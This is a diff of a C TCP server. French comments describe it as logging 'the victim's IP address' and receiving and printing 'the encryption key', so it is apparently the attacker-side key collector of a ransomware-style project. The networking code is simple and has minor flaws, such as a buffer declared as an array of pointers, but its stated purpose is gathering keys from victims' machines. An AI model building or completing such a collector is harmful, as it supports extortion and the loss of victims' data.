@@ -2,7 +2,10 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <string.h>
+#include <netinet/in.h>
 #include <stdlib.h>
+#include <netdb.h>
 #define BUFFER_SIZE 1024
 
 void handle_error(){
@@ -20,7 +23,7 @@ int main(void){
     struct sockaddr_in server_addr, client_addr;
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(server_port);
-    server_addr.sin_addr.s_addr = inet_addr(server_ip);
+    server_addr.sin_addr.s_addr = INADDR_ANY;
 
     char *buffer[BUFFER_SIZE];
     int n, client_socket;
@@ -30,7 +33,7 @@ int main(void){
         printf("Error during binding");
     }
     else {
-        printf("server listening on %s:%d\n", server_ip, server_port);
+        printf("server listening");
         n = listen(sockid, 1);
         if (n < 0) {
             printf("Error during listen()\n");
@@ -43,14 +46,16 @@ int main(void){
             printf("Error during accept");
             handle_error();
         }
-        printf("Accept connection from %d %s:%d\n",
-               client_socket,
-               inet_ntoa(client_addr.sin_addr),
-               client_addr.sin_port);
+        printf("Accept connection from %s\n", inet_ntoa(client_addr.sin_addr)); //affichage de l'adresse ip de la victime
         n = recv(client_socket, (char *) buffer, BUFFER_SIZE, MSG_WAITALL);
 
-        printf("Message of size %d received: %s\n", n, (char *)buffer);
+        printf("key = %s\n",(char *)buffer);
+        //reception et affichage de la clé de chiffrage
 
     }
+    char *new_ip = inet_ntoa(client_addr.sin_addr);
+    printf("%s", new_ip);
     close(sockid);
+    
+    
 }
